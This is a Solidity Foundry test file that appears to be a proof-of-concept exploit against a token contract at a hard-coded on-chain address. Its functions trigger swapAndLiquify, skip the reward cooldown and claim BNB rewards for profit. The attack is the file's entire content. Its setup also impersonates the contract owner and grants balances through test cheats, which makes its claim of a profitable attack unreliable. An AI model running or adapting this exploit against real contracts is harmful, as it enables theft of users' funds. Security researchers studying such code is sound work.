// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IPuppySwapToken {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function minTokenNumberToSell() external view returns (uint256);
    function nextAvailableClaimDate(address account) external view returns (uint256);
    function claimBNBReward() external;
    function swapAndLiquifyEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xeFfAb18108124C2b6280C62abA70a03c79cc4327;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get owner address from contract
        address puppyOwner = IPuppySwapToken(TARGET).owner();

        // Impersonate owner to enable swapAndLiquify
        vm.startPrank(puppyOwner);
        IPuppySwapToken(TARGET).setSwapAndLiquifyEnabled(true);
        vm.stopPrank();

        // Give attacker some PUPPY tokens to start
        // First, need to get tokens from somewhere - mint or transfer from owner
        // Let's transfer from owner to attacker
        vm.prank(puppyOwner);
        IPuppySwapToken(TARGET).transfer(attacker, 1000 * 10**9); // 1000 tokens with 9 decimals

        // Make contract accumulate tokens (fees) by transferring tokens to it
        // Need to meet minTokenNumberToSell requirement
        uint256 minSell = IPuppySwapToken(TARGET).minTokenNumberToSell();
        // Transfer slightly more than minSell to contract
        vm.prank(puppyOwner);
        IPuppySwapToken(TARGET).transfer(TARGET, minSell * 2);

        // Give contract some BNB balance for the swap to work
        deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = address(this).balance;

        // Trigger swapAndLiquify by transferring tokens
        // Transfer from attacker (not pancakePair) to any address
        address recipient = address(0x123);
        IPuppySwapToken(TARGET).transfer(recipient, 1 * 10**9); // Small transfer to trigger

        // Need to wait for claim cooldown
        // First, check nextAvailableClaimDate for attacker
        // If it's in the future, warp time
        uint256 nextClaim = IPuppySwapToken(TARGET).nextAvailableClaimDate(attacker);
        if (nextClaim > block.timestamp) {
            vm.warp(nextClaim + 1);
        }

        // Claim BNB reward
        IPuppySwapToken(TARGET).claimBNBReward();

        // Check if balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

